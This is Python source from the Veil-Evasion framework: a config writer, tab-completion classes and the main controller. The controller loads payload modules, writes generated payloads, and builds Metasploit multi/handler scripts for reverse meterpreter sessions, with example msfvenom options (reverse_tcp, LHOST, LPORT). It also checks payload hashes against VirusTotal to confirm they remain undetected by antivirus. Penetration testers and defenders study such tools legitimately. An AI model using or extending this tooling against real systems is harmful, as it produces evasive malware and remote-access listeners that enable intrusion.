__FILENAME__ = update
#!/usr/bin/python

import platform, os, sys

"""

Take an options dictionary and update /etc/veil/settings.py

"""
def generateConfig(options):
    
    config = """#!/usr/bin/python

##################################################################################################
#
# Veil-Framework configuration file                                               
#
# Run update.py to automatically set all these options to their defaults.
#
##################################################################################################



#################################################
#
# General system options
#
#################################################

"""
    print "\n Veil-Framework configuration:"

    config += '# OS to use (Kali/Backtrack/Debian/Windows)\n'
    config += 'OPERATING_SYSTEM="' + options['OPERATING_SYSTEM'] + '"\n\n'
    print "\n [*] OPERATING_SYSTEM = " + options['OPERATING_SYSTEM']

    config += '# Terminal clearing method to use\n'
    config += 'TERMINAL_CLEAR="' + options['TERMINAL_CLEAR'] + '"\n\n'
    print " [*] TERMINAL_CLEAR = " + options['TERMINAL_CLEAR']

    config += '# Path to temporary directory\n'
    config += 'TEMP_DIR="' + options["TEMP_DIR"] + '"\n\n'
    print " [*] TEMP_DIR = " + options["TEMP_DIR"]

    config += '# Default options to pass to msfvenom for shellcode creation\n'
    config += 'MSFVENOM_OPTIONS="' + options['MSFVENOM_OPTIONS'] + '"\n\n'
    print " [*] MSFVENOM_OPTIONS = " + options['MSFVENOM_OPTIONS']
    
    config += '# The path to the metasploit framework, for example: /usr/share/metasploit-framework/\n'
    config += 'METASPLOIT_PATH="' + options['METASPLOIT_PATH'] + '"\n\n'
    print " [*] METASPLOIT_PATH = " + options['METASPLOIT_PATH']

    config += '# The path to pyinstaller, for example: /usr/share/pyinstaller/\n'
    config += 'PYINSTALLER_PATH="' + options['PYINSTALLER_PATH'] + '"\n\n'
    print " [*] PYINSTALLER_PATH = " + options['PYINSTALLER_PATH'] + "\n"


    config += """
#################################################
#
# Veil-Evasion specific options
#
#################################################

"""
    config += '# Veil-Evasion install path\n'
    config += 'VEIL_EVASION_PATH="' + options['VEIL_EVASION_PATH'] + '"\n\n'
    print " [*] VEIL_EVASION_PATH = " + options['VEIL_EVASION_PATH']
    
    source_path = os.path.expanduser(options["PAYLOAD_SOURCE_PATH"])
    config += '# Path to output the source of payloads\n'
    config += 'PAYLOAD_SOURCE_PATH="' + source_path + '"\n\n'
    print " [*] PAYLOAD_SOURCE_PATH = " + source_path

    # create the output source path if it doesn't exist
    if not os.path.exists(source_path): 
        os.makedirs(source_path)
        print " [*] Path '" + source_path + "' Created"
    
    compiled_path = os.path.expanduser(options["PAYLOAD_COMPILED_PATH"])
    config += '# Path to output compiled payloads\n'
    config += 'PAYLOAD_COMPILED_PATH="' + compiled_path +'"\n\n'
    print " [*] PAYLOAD_COMPILED_PATH = " + compiled_path

    # create the output compiled path if it doesn't exist
    if not os.path.exists( compiled_path ): 
        os.makedirs( compiled_path )
        print " [*] Path '" + compiled_path + "' Created"

    handler_path = os.path.expanduser(options["HANDLER_PATH"])
    # create the output compiled path if it doesn't exist
    if not os.path.exists( handler_path ): 
        os.makedirs( handler_path )
        print " [*] Path '" + handler_path + "' Created"

    config += '# Whether to generate a msf handler script and where to place it\n'
    config += 'GENERATE_HANDLER_SCRIPT="' + options['GENERATE_HANDLER_SCRIPT'] + '"\n'
    print " [*] GENERATE_HANDLER_SCRIPT = " + options['GENERATE_HANDLER_SCRIPT']
    config += 'HANDLER_PATH="' + handler_path + '"\n\n'
    print " [*] HANDLER_PATH = " + handler_path

    hash_path = os.path.expanduser(options["HASH_LIST"])
    config += '# Running hash list of all payloads generated\n'
    config += 'HASH_LIST="' + hash_path + '"\n\n'
    print " [*] HASH_LIST = " + hash_path + "\n"


    config += """
#################################################
#
# Veil-Catapult specific options
#
#################################################

"""
    config += '# Veil-Catapult install path\n'
    config += 'VEIL_CATAPULT_PATH="' + options['VEIL_CATAPULT_PATH'] + '"\n\n'
    print " [*] VEIL_CATAPULT_PATH = " + options['VEIL_CATAPULT_PATH']

    catapult_resource_path = os.path.expanduser(options["CATAPULT_RESOURCE_PATH"])
    # create the catapult resource path if it doesn't exist
    if not os.path.exists( catapult_resource_path ): 
        os.makedirs( catapult_resource_path )
        print " [*] Path '" + catapult_resource_path + "' Created"
    config += '# Path to output Veil-Catapult resource/cleanup files\n'
    config += 'CATAPULT_RESOURCE_PATH="' + catapult_resource_path + '"\n\n'
    print " [*] CATAPULT_RESOURCE_PATH = " + catapult_resource_path + "\n"


    if platform.system() == "Linux":
        # create the output compiled path if it doesn't exist
        if not os.path.exists("/etc/veil/"): 
            os.makedirs("/etc/veil/")
            print " [*] Path '/etc/veil/' Created"
        f = open("/etc/veil/settings.py", 'w')
        f.write(config)
        f.close()
        print " Configuration File Written To '/etc/veil/settings.py'\n"
    else:
        print " [!] ERROR: PLATFORM NOT CURRENTLY SUPPORTED"
        sys.exit()


if __name__ == '__main__':

    options = {}

    if platform.system() == "Linux":
        
        # check /etc/issue for the exact linux distro
        issue = open("/etc/issue").read()
        
        if issue.startswith("Kali"):
            options["OPERATING_SYSTEM"] = "Kali"
            options["TERMINAL_CLEAR"] = "clear"
            options["METASPLOIT_PATH"] = "/usr/share/metasploit-framework/"
            if os.path.isdir('/usr/share/pyinstaller'):
                options["PYINSTALLER_PATH"] = "/usr/share/pyinstaller/"
            else:
                options["PYINSTALLER_PATH"] = "/opt/pyinstaller-2.0/"
        elif issue.startswith("BackTrack"):
            options["OPERATING_SYSTEM"] = "BackTrack"
            options["TERMINAL_CLEAR"] = "clear"
            options["METASPLOIT_PATH"] = "/opt/metasploit/msf3/"
            options["PYINSTALLER_PATH"] = "/opt/pyinstaller-2.0/"
        else:
            options["OPERATING_SYSTEM"] = "Linux"
            options["TERMINAL_CLEAR"] = "clear"
            msfpath = raw_input(" [>] Please enter the path of your metasploit installation: ")
            options["METASPLOIT_PATH"] = msfpath
            options["PYINSTALLER_PATH"] = "/opt/pyinstaller-2.0/"
        
        
        # last of the general options
        options["TEMP_DIR"]="/tmp/"
        options["MSFVENOM_OPTIONS"]=""

        # Veil-Evasion specific options
        veil_evasion_path = "/".join(os.getcwd().split("/")[:-1]) + "/"
        options["VEIL_EVASION_PATH"] = veil_evasion_path
        options["PAYLOAD_SOURCE_PATH"] = "~/veil-output/source/"
        options["PAYLOAD_COMPILED_PATH"] = "~/veil-output/compiled/"
        options["GENERATE_HANDLER_SCRIPT"] = "True"
        options["HANDLER_PATH"] = "~/veil-output/handlers/"
        options["HASH_LIST"] = "~/veil-output/hashes.txt"

        # Veil-Catapult specific options
        veil_catapult_path = "/".join(os.getcwd().split("/")[:-2]) + "/Veil-Catapult/"
        options["VEIL_CATAPULT_PATH"] = veil_catapult_path
        options["CATAPULT_RESOURCE_PATH"] = "~/veil-output/catapult/"

    
    # unsupported platform... 
    else:
        print " [!] ERROR: PLATFORM NOT CURRENTLY SUPPORTED"
        sys.exit()

    generateConfig(options)

########NEW FILE########
__FILENAME__ = completers
"""

Contains any classes used for tab completion.


Reference - http://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input

"""

# Import Modules
import readline
import commands
import re
import os

class none(object):
    def complete(self, args):
        return [None]

class MainMenuCompleter(object):
    """
    Class used for tab completion of the main Controller menu
    
    Takes a list of available commands, and loaded payload modules.
    
    """
    def __init__(self, cmds, payloads):
        self.commands = [cmd for (cmd,desc) in cmds]
        self.payloads = payloads

    def complete_use(self, args):
        """Complete payload/module"""

        res = []
        payloads = []

        for (name, payload) in self.payloads:
            payloads.append(name)

        # return all payloads if we just have "use"
        if len(args[0].split("/")) == 1:
            res = [ m for m in payloads if m.startswith(args[0])] + [None]

        else:
            # get the language
            lang = args[0].split("/")[0]
            # get the rest of the paths
            rest = "/".join(args[0].split("/")[1:])

            payloads = []
            for (name, payload) in self.payloads:

                parts = name.split("/")

                # iterate down the split parts so we can handle the nested payload structure
                for x in xrange(len(parts)):

                    # if the first part of the iterated payload matches the language, append it
                    if parts[x] == lang:
                        payloads.append("/".join(parts[x+1:]))

                res = [ lang + '/' + m + ' ' for m in payloads if m.startswith(rest)] + [None]
                
        return res

    
    def complete_info(self, args):
        """Complete payload/module"""

        res = []
        payloads = []

        for (name, payload) in self.payloads:
            payloads.append(name)

        # return all payloads if we just have "use"
        if len(args[0].split("/")) == 1:
            res = [ m for m in payloads if m.startswith(args[0])] + [None]

        else:
            # get the language
            lang = args[0].split("/")[0]
            # get the rest of the paths
            rest = "/".join(args[0].split("/")[1:])

            payloads = []
            for (name, payload) in self.payloads:

                parts = name.split("/")

                # iterate down the split parts so we can handle the nested payload structure
                for x in xrange(len(parts)):

                    # if the first part of the iterated payload matches the language, append it
                    if parts[x] == lang:
                        payloads.append("/".join(parts[x+1:]))

                res = [ lang + '/' + m + ' ' for m in payloads if m.startswith(rest)] + [None]
                
        return res


    def complete(self, text, state):
        
        "Generic readline completion entry point."
        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()
        
        # show all commands
        if not line:
            return [c + ' ' for c in self.commands][state]
            
        # account for last argument ending in a space
        RE_SPACE = re.compile('.*\s+$', re.M)
        if RE_SPACE.match(buffer):
            line.append('')
            
        # resolve command to the implementation functions (above)
        cmd = line[0].strip()
        if cmd in self.commands:
            impl = getattr(self, 'complete_%s' % cmd)
            args = line[1:]
            if args:
                return (impl(args) + [None])[state]
            return [cmd + ' '][state]
            
        results = [ c + ' ' for c in self.commands if c.startswith(cmd)] + [None]
        
        return results[state]


class PayloadCompleter(object):

    def __init__(self, cmds, payload):
        self.commands = [cmd for (cmd,desc) in cmds]
        self.payload = payload


    def _listdir(self, root):
        """
        Complete a directory path.
        """
        res = []
        for name in os.listdir(root):
            path = os.path.join(root, name)
            if os.path.isdir(path):
                name += os.sep
            res.append(name)
        return res

    def _complete_path(self, path=None):
        """
        Complete a file path.
        """
        if not path:
            return self._listdir('.')
        dirname, rest = os.path.split(path)
        tmp = dirname if dirname else '.'
        res = [os.path.join(dirname, p)
                for p in self._listdir(tmp) if p.startswith(rest)]
        # more than one match, or single match which does not exist (typo)
        if len(res) > 1 or not os.path.exists(path):
            return res
        # resolved to a single directory, so return list of files below it
        if os.path.isdir(path):
            return [os.path.join(path, p) for p in self._listdir(path)]
        # exact file match terminates this completion
        return [path + ' ']

    def complete_path(self, args):
        """
        Entry point for path completion.
        """
        if not args:
            return self._complete_path('.')
        # treat the last arg as a path and complete it
        return self._complete_path(args[-1])


    def complete_set(self, args):
        """
        Complete all options for the 'set' command.
        """
        
        res = []
        
        if hasattr(self.payload, 'required_options'):
        
            options = [k for k in sorted(self.payload.required_options.iterkeys())]
            
            if args[0] != "":
                if args[0].strip() == "LHOST":
                    # autocomplete the IP for LHOST
                    res = [commands.getoutput("/sbin/ifconfig").split("\n")[1].split()[1][5:]] + [None]
                elif args[0].strip() == "LPORT":
                    # autocomplete the common MSF port of 4444 for LPORT
                    res = ["4444"] + [None]
                elif args[0].strip() == "original_exe":
                    # tab-complete a file path for an exe
                    res = self.complete_path(args)
                elif args[0].strip().endswith("_source"):
                    # tab-complete a file path for an exe
                    res = self.complete_path(args)
                # elif args[0].strip() == "other path-needing option":
                #     # tab-complete a file path
                #     res = self.complete_path(args)
                else:
                    # complete the command in the list ONLY if it's partially completed
                    res = [ o + ' ' for o in options if (o.startswith(args[0]) and o != args[0] )] + [None]
            else:
                # return all required_options available to 'set'
                res = [ o + ' ' for o in options] + [None]

        return res


    def complete(self, text, state):
        """
        Generic readline completion entry point.
        """

        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()
        
        # show all commands
        if not line:
            return [c + ' ' for c in self.commands][state]
            
        # account for last argument ending in a space
        RE_SPACE = re.compile('.*\s+$', re.M)
        if RE_SPACE.match(buffer):
            line.append('')
            
        # resolve command to the implementation functions (above)
        cmd = line[0].strip()
        if cmd in self.commands:
            impl = getattr(self, 'complete_%s' % cmd)
            args = line[1:]
            if args:
                return (impl(args) + [None])[state]
            return [cmd + ' '][state]
            
        results = [ c + ' ' for c in self.commands if c.startswith(cmd)] + [None]
        
        return results[state]


class MSFCompleter(object):
    """
    Class used for tab completion of metasploit payload selection.
    Used in ./modules/common/shellcode.py
    
    Takes a payloadTree next dictionary as an instantiation argument, of the form
        payloadTree = {"windows" : {"meterpreter", "shell",...}, "linux" : {...}}

    """
    def __init__(self, payloadTree):
        self.payloadTree = payloadTree
    

    def complete(self, text, state):

        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()
        
        # extract available platforms from the payload tree
        platforms = [k for k,v in self.payloadTree.items()]
        
        # show all platforms
        if not line:
            return [p + '/' for p in platforms][state]
            
        # account for last argument ending in a space
        RE_SPACE = re.compile('.*\s+$', re.M)
        if RE_SPACE.match(buffer):
            line.append('')
        
        i = line[0].strip()
        
        # complete the platform
        if len(i.split("/")) == 1:
            results = [p + '/' for p in platforms if p.startswith(i)] + [None]
            return results[state]
            
        # complete the stage, including singles (no /)
        elif len(i.split("/")) == 2:
            platform = i.split("/")[0]
            stage = i.split("/")[1]
            stages = [ k for  k,v in self.payloadTree[platform].items()]
            results = [platform + "/" + s + '/' for s in stages if s.startswith(stage) and type(self.payloadTree[platform][s]) is dict]
            singles = [platform + "/" + s + ' ' for s in stages if s.startswith(stage) and type(self.payloadTree[platform][s]) is not dict]
            results += singles + [None]
            return results[state]
        
        # complete the stage (for x64) or stager (for x86)
        elif len(i.split("/")) == 3:

            platform = i.split("/")[0]
            stage = i.split("/")[1]
            stager = i.split("/")[2]

            stagers = [k for k,v in self.payloadTree[platform][stage].items()]

            results = [platform + "/" + stage + '/' + s + '/' for s in stagers if s.startswith(stager) and type(self.payloadTree[platform][stage][s]) is dict]
            singles = [platform + "/" + stage + '/' + s + ' ' for s in stagers if s.startswith(stager) and type(self.payloadTree[platform][stage][s]) is not dict]
            results += singles + [None]

            return results[state]
            
        # complete the stager for x64 (i.e. reverse_tcp)
        elif len(i.split("/")) == 4:
            
            platform = i.split("/")[0]
            arch = i.split("/")[1]
            stage = i.split("/")[2]
            stager = i.split("/")[3]
            
            stagers = [k for k,v in self.payloadTree[platform][arch][stage].items()]
            
            results = [platform + "/" + arch + "/" + stage + '/' + s for s in stagers if s.startswith(stager)] + [None]
            return results[state]
        
        else:
            return ""


class IPCompleter(object):
    """
    Class used for tab completion of local IP for LHOST.
    
    """
    def __init__(self):
        pass
        
    """
    If blank line, fill in the local IP
    """
    def complete(self, text, state):

        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()

        if not line:
            ip = [commands.getoutput("/sbin/ifconfig").split("\n")[1].split()[1][5:]] + [None]
            return ip[state]
        else:
            return text[state]
            

class MSFPortCompleter(object):
    """
    Class used for tab completion of the default port (4444) for MSF payloads
    
    """
    def __init__(self):
        pass
        
    """
    If blank line, fill in 4444
    """
    def complete(self, text, state):

        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()

        if not line:
            port = ["4444"] + [None]
            return port[state]
        else:
            return text[state]


class PathCompleter(object):
    """
    Class used for tab completion of files on the local path.
    """
    def __init__(self):
        pass

    def _listdir(self, root):
        res = []
        for name in os.listdir(root):
            path = os.path.join(root, name)
            if os.path.isdir(path):
                name += os.sep
            res.append(name)
        return res

    def _complete_path(self, path=None):
        if not path:
            return self._listdir('.')
        dirname, rest = os.path.split(path)
        tmp = dirname if dirname else '.'
        res = [os.path.join(dirname, p)
                for p in self._listdir(tmp) if p.startswith(rest)]
        # more than one match, or single match which does not exist (typo)
        if len(res) > 1 or not os.path.exists(path):
            return res
        # resolved to a single directory, so return list of files below it
        if os.path.isdir(path):
            return [os.path.join(path, p) for p in self._listdir(path)]
        # exact file match terminates this completion
        return [path + ' ']

    def complete_path(self, args):
        if not args:
            return self._complete_path('.')
        # treat the last arg as a path and complete it
        return self._complete_path(args[-1])

    def complete(self, text, state):

        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()

        return (self.complete_path(line) + [None])[state]

########NEW FILE########
__FILENAME__ = controller
"""
Contains the main controller object for Veil-Evasion.

"""

# Import Modules
import glob
import imp
import sys
import os
import readline
import re
import socket
import commands
import time
import subprocess
import hashlib
from subprocess import Popen, PIPE


# try to find and import the settings.py config file
if os.path.exists("/etc/veil/settings.py"):
    try:
        sys.path.append("/etc/veil/")
        import settings

        # check for a few updated values to see if we have a new or old settings.py file
        try:
            settings.VEIL_EVASION_PATH
        except AttributeError:
            os.system('clear')
            print '========================================================================='
            print ' New major Veil-Evasion version installed'
            print ' Re-running ./setup/setup.sh'
            print '========================================================================='
            time.sleep(3)
            os.system('cd setup && ./setup.sh')

            # reload the settings import to refresh the values
            reload(settings)

    except ImportError:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()
elif os.path.exists("./config/settings.py"):
    try:
        sys.path.append("./config")
        import settings
    except ImportError:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()
else:
    # if the file isn't found, try to run the update script
    os.system('clear')
    print '========================================================================='
    print ' Veil First Run Detected... Initializing Script Setup...'
    print '========================================================================='
    # run the config if it hasn't been run
    print '\n [*] Executing ./setup/setup.sh'
    os.system('cd setup && ./setup.sh')

    # check for the config again and error out if it can't be found.
    if os.path.exists("/etc/veil/settings.py"):
        try:
            sys.path.append("/etc/veil/")
            import settings
        except ImportError:
            print "\n [!] ERROR: run ./config/update.py manually\n"
            sys.exit()
    elif os.path.exists("./config/settings.py"):
        try:
            sys.path.append("./config")
            import settings
        except ImportError:
            print "\n [!] ERROR: run ./config/update.py manually\n"
            sys.exit()
    else:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()


from os.path import join, basename, splitext
from modules.common import messages
from modules.common import helpers
from modules.common import supportfiles
from modules.common import completers


class Controller:
    """
    Principal controller object that's instantiated.

    Loads all payload modules dynamically from ./modules/payloads/* and
    builds store the instantiated payload objects in self.payloads.
    has options to list languages/payloads, manually set payloads,
    generate code, and provides the main interactive
    menu that lists payloads and allows for user ineraction.
    """

    def __init__(self, langs = None, oneRun=True):
        self.payloads = list()
        # a specific payload, so we can set it manually
        self.payload = None
        # restrict loaded modules to specific languages
        self.langs = langs

        # oneRune signifies whether to only generate one payload, as we would
        # if being invoked from external code.
        # defaults to True, so Veil.py needs to manually specific "False" to
        # ensure an infinite loop
        self.oneRun = oneRun

        self.outputFileName = ""

        self.commands = [   ("use","use a specific payload"),
                            ("info","information on a specific payload"),
                            ("list","list available payloads"),
                            ("update","update Veil to the latest version"),
                            ("clean","clean out payload folders"),
                            ("checkvt","check payload hashes vs. VirusTotal"),
                            ("exit","exit Veil")]

        self.payloadCommands = [    ("set","set a specific option value"),
                                    ("info","show information about the payload"),
                                    ("generate","generate payload"),
                                    ("back","go to the main menu"),
                                    ("exit","exit Veil")]

        self.LoadPayloads()


    def LoadPayloads(self):
        """
        Crawl the module path and load up everything found into self.payloads.
        """
            
        # crawl up to 5 levels down the module path
        for x in xrange(1,5):    
            # make the folder structure the key for the module

            d = dict( (path[path.find("payloads")+9:-3], imp.load_source( "/".join(path.split("/")[3:])[:-3],path )  ) for path in glob.glob(join(settings.VEIL_EVASION_PATH+"/modules/payloads/" + "*/" * x,'[!_]*.py')) )

            # instantiate the payload stager
            for name in d.keys():
                module = d[name].Payload()
                self.payloads.append( (name, module) )

        # sort payloads by their key/path name
        self.payloads = sorted(self.payloads, key=lambda x: (x[0]))


    def ListPayloads(self):
        """
        Prints out available payloads in a nicely formatted way.
        """

        print helpers.color(" [*] Available payloads:\n")
        lastBase = None
        x = 1
        for (name, payload) in self.payloads:
            parts = name.split("/")
            if lastBase and parts[0] != lastBase:
                print ""
            lastBase = parts[0]
            print "\t%s)\t%s" % (x, '{0: <24}'.format(name))
            x += 1
        print ""


    def UpdateVeil(self, interactive=True):
        """
        Updates Veil by invoking git pull on the OS 

        """
        print "\n Updating Veil via git...\n"
        updatecommand = ['git', 'pull']
        updater = subprocess.Popen(updatecommand, cwd=settings.VEIL_EVASION_PATH, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        updoutput, upderr = updater.communicate()

        if interactive:
            raw_input(" [>] Veil updated, press any key to continue: ")


    def CheckVT(self, interactive=True):
        """
        Checks payload hashes in veil-output/hashes.txt vs VirusTotal
        """

        # Command for in-menu vt-notify check against hashes within hash file
        # It's only triggered if selected in menu and file isn't empty
        try:
            if os.stat(settings.HASH_LIST)[6] != 0:
                checkVTcommand = "./vt-notify.rb -f " + settings.HASH_LIST + " -i 0"
                print helpers.color("\n [*] Checking Virus Total for payload hashes...\n")
                checkVTout = Popen(checkVTcommand.split(), stdout=PIPE, cwd=settings.VEIL_EVASION_PATH + "tools/vt-notify/")

                found = False
                for line in checkVTout.stdout:
                    if "was found" in line:
                        filehash, filename = line.split()[0].split(":")
                        print helpers.color(" [!] File %s with hash %s found!" %(filename, filehash), warning=True)
                        found = True
                if found == False:
                    print " [*] No payloads found on VirusTotal!"

                raw_input("\n [>] Hit enter to continue...")

            else:
                print helpers.color("\n [!] Hash file is empty, generate a payload first!", warning=True)
                raw_input("\n [>] Press enter to continue...")

        except OSError as e:
            print helpers.color("\n [!] Error: hash list %s not found" %(settings.HASH_LIST), warning=True)
            raw_input("\n [>] Press enter to continue...")


    def CleanPayloads(self, interactive=True):
        """
        Cleans out the payload source/compiled/handler folders.
        """
        
        # prompt for confirmation if we're in the interactive menu
        if interactive:
            choice = raw_input("\n [>] Are you sure you want to clean payload folders? [y/N] ")

            if choice.lower() == "y":
                print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
                os.system('rm %s/*.* 2>/dev/null' %(settings.PAYLOAD_SOURCE_PATH))

                print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
                os.system('rm %s/*.exe 2>/dev/null' %(settings.PAYLOAD_COMPILED_PATH))

                print " [*] Cleaning %s" %(settings.HANDLER_PATH)
                os.system('rm %s/*.rc 2>/dev/null' %(settings.HANDLER_PATH))

                print " [*] cleaning %s" %(settings.HASH_LIST)
                os.system('rm %s 2>/dev/null' %(settings.HASH_LIST))
                os.system('touch ' + settings.HASH_LIST)

                print " [*] cleaning ./tools/vt-notify/results.log"
                os.system('rm ./tools/vt-notify/results.log 2>/dev/null')

                choice = raw_input("\n [>] Folders cleaned, press any key to return to the main menu: ")
        
        else:
            print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
            os.system('rm %s/*.* 2>/dev/null' %(settings.PAYLOAD_SOURCE_PATH))

            print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
            os.system('rm %s/*.exe 2>/dev/null' %(settings.PAYLOAD_COMPILED_PATH))

            print " [*] Cleaning %s" %(settings.HANDLER_PATH)
            os.system('rm %s/*.rc 2>/dev/null' %(settings.HANDLER_PATH))

            print " [*] cleaning %s" %(settings.HASH_LIST)
            os.system('rm %s 2>/dev/null' %(settings.HASH_LIST))
            os.system('touch ' + settings.HASH_LIST)

            print "\n [*] Folders cleaned\n"


    def PayloadInfo(self, payload, showTitle=True, showInfo=True):
        """
        Print out information about a specified payload.

        payload = the payload object to print information on
        showTitle = whether to show the Veil title
        showInfo = whether to show the payload information bit

        """
        if showTitle:
            messages.title()

        if showInfo:
            # extract the payload class name from the instantiated object, then chop off the load folder prefix
            payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])

            print helpers.color(" Payload information:\n")
            print "\tName:\t\t" + payloadname
            print "\tLanguage:\t" + payload.language
            print "\tRating:\t\t" + payload.rating

            if hasattr(payload, 'shellcode'):
                if self.payload.shellcode.customshellcode:
                    print "\tShellcode:\t\tused"

            # format this all nice-like
            print helpers.formatLong("Description:", payload.description)

        # if required options were specified, output them
        if hasattr(self.payload, 'required_options'):
            print helpers.color("\n Required Options:\n")

            print " Name\t\t\tCurrent Value\tDescription"
            print " ----\t\t\t-------------\t-----------"

            # sort the dictionary by key before we output, so it looks nice
            for key in sorted(self.payload.required_options.iterkeys()):
                print " %s\t%s\t%s" % ('{0: <16}'.format(key), '{0: <8}'.format(payload.required_options[key][0]), payload.required_options[key][1])

            print ""


    def SetPayload(self, payloadname, options):
        """
        Manually set the payload for this object with specified options.

        name = the payload to set, ex: c/meter/rev_tcp
        options = dictionary of required options for the payload, ex:
                options['customShellcode'] = "\x00..."
                options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
                options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
        """

        # iterate through the set of loaded payloads, trying to find the specified payload name
        for (name, payload) in self.payloads:

            if payloadname.lower() == name.lower():

                # set the internal payload variable
                self.payload = payload

                # options['customShellcode'] = "\x00..."
                if 'customShellcode' in options:
                    self.payload.shellcode.setCustomShellcode(options['customShellcode'])
                # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
                if 'required_options' in options:
                    for k,v in options['required_options'].items():
                        self.payload.required_options[k] = v
                # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
                if 'msfvenom' in options:
                    self.payload.shellcode.SetPayload(options['msfvenom'])

        # if a payload isn't found, then list available payloads and exit
        if not self.payload:
            print helpers.color(" [!] Invalid payload selected\n\n", warning=True)
            self.ListPayloads()
            sys.exit()


    def ValidatePayload(self, payload):
        """
        Check if all required options are filled in.

        Returns True if valid, False otherwise.
        """

        # don't worry about shellcode - it validates itself


        # validate required options if present
        if hasattr(payload, 'required_options'):
            for key in sorted(self.payload.required_options.iterkeys()):
                if payload.required_options[key][0] == "":
                    return False

        return True


    def GeneratePayload(self):
        """
        Calls self.payload.generate() to generate payload code.

        Returns string of generated payload code.
        """
        return self.payload.generate()


    def OutputMenu(self, payload, code, showTitle=True, interactive=True, args=None):
        """
        Write a chunk of payload code to a specified ouput file base.
        Also outputs a handler script if required from the options.

        code = the source code to write
        OutputBaseChoice = "payload" or user specified string

        Returns the full name the source was written to.
        """

        # if we have arguments passed, extract out the values we want
        if args:
            OutputBaseChoice = args.o
            overwrite = args.overwrite

        # if we get .exe or ELF (with no base) code back, output to the compiled folder, otherwise write to the source folder
        if payload.extension == "exe" or payload.extension == "war":
            outputFolder = settings.PAYLOAD_COMPILED_PATH
        # Check for ELF binary
        elif hasattr(payload, 'type') and payload.type == "ELF":
            outputFolder = settings.PAYLOAD_COMPILED_PATH
        else:
            outputFolder = settings.PAYLOAD_SOURCE_PATH

        # only show get input if we're doing the interactive menu
        if interactive:
            if showTitle:
                messages.title()

            # Get the base install name for the payloads (i.e. OutputBaseChoice.py/OutputBaseChoice.exe)
            print " [*] Press [enter] for 'payload'"
            OutputBaseChoice = raw_input(" [>] Please enter the base name for output files: ")

            # ensure we get a base name and not a full path
            while OutputBaseChoice != "" and "/" in OutputBaseChoice:
                OutputBaseChoice = raw_input(helpers.color(" [!] Please enter a base name, not a full path: ", warning=True))

        # for invalid output base choices that are passed by arguments
        else:
            if "/" in OutputBaseChoice:
                print helpers.color(" [!] Please provide a base name, not a path, for the output base", warning=True)
                print helpers.color(" [!] Defaulting to 'payload' for output base...", warning=True)
                OutputBaseChoice = "payload"

        if OutputBaseChoice == "": OutputBaseChoice = "payload"

        # if we are overwriting, this is the base choice used
        FinalBaseChoice = OutputBaseChoice

        # if we're not overwriting output files, walk the existing and increment
        if not overwrite:
            # walk the output path and grab all the file bases, disregarding extensions
            fileBases = []
            for (dirpath, dirnames, filenames) in os.walk(outputFolder):
                fileBases.extend(list(set([x.split(".")[0] for x in filenames if x.split(".")[0] != ''])))
                break

            # as long as the file exists, increment a counter to add to the filename
            # i.e. "payload3.py", to make sure we don't overwrite anything
            FinalBaseChoice = OutputBaseChoice
            x = 1
            while FinalBaseChoice in fileBases:
                FinalBaseChoice = OutputBaseChoice + str(x)
                x += 1

        # set the output name to /outout/source/BASENAME.EXT unless it is an ELF then no extension
        if hasattr(payload, 'type') and payload.type == "ELF":
            OutputFileName = outputFolder + FinalBaseChoice + payload.extension
        else:
            OutputFileName = outputFolder + FinalBaseChoice + "." + payload.extension

        OutputFile = open(OutputFileName, 'w')
        OutputFile.write(code)
        OutputFile.close()

        # start building the information string for the generated payload
        # extract the payload class name from the instantiated object, then chop off the load folder prefix
        payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
        message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payloadname
        handler = ""
        
        if hasattr(payload, 'shellcode'):
            # check if msfvenom was used or something custom, print appropriately
            if payload.shellcode.customshellcode != "":
                message += "\n Shellcode:\t\tcustom"
            else:
                message += "\n Shellcode:\t\t" + payload.shellcode.msfvenompayload

                # if the shellcode wasn't custom, build out a handler script
                handler = "use exploit/multi/handler\n"
                handler += "set PAYLOAD " + payload.shellcode.msfvenompayload + "\n"

                # extract LHOST if it's there
                p = re.compile('LHOST=(.*?) ')
                parts = p.findall(payload.shellcode.msfvenomCommand)
                if len(parts) > 0:
                    handler += "set LHOST " + parts[0] + "\n"
                else:
                    # try to extract this local IP
                    handler += "set LHOST " + helpers.LHOST() + "\n"
                
                # extract LPORT if it's there
                p = re.compile('LPORT=(.*?) ')
                parts = p.findall(payload.shellcode.msfvenomCommand)
                if len(parts) > 0:
                    handler += "set LPORT " + parts[0] + "\n"

                # Removed autoscript smart migrate due to users on forum saying that migrate itself caused detection
                # in an otherwise undetectable (at the time) payload
                handler += "set ExitOnSession false\n"
                handler += "exploit -j\n"

            # print out any msfvenom options we used in shellcode generation if specified
            if len(payload.shellcode.options) > 0:
                message += "\n Options:\t\t"
                parts = ""
                for option in payload.shellcode.options:
                    parts += ' ' + option + ' '
                message += parts.strip()

            # reset the internal shellcode state the options don't persist
            payload.shellcode.Reset()

        # if required options were specified, output them
        if hasattr(payload, 'required_options'):
            t = ""
            # sort the dictionary by key before we output, so it looks nice
            for key in sorted(payload.required_options.iterkeys()):
                t += " " + key + "=" + payload.required_options[key][0] + " "
